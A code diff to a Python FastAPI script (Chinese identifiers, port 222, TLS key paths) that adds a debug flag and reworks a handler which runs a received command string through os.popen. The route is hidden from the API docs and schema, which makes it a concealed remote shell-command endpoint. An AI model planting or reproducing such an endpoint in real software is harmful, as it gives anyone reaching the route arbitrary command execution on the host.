@@ -2,6 +2,7 @@
 私钥路径 = ""
 证书路径 = ""
 端口 = 222
+调试模式 = False
 
 if __name__ == "__main__":
     import os
@@ -57,9 +58,11 @@ if __name__ == "__main__":
     app = FastAPI(docs_url=None, redoc_url=None)
 
     def handler(command: str):
-        print(command)
-        result = os.popen(command).read()
-        return result
+        if 调试模式:
+            print(command)
+        r1 = os.popen(command)
+        r2 = r1.buffer.read().decode(errors='replace')
+        return r2
     
     exec(f'''
 @app.get("{PATH}", response_class=HTMLResponse, include_in_schema=False)
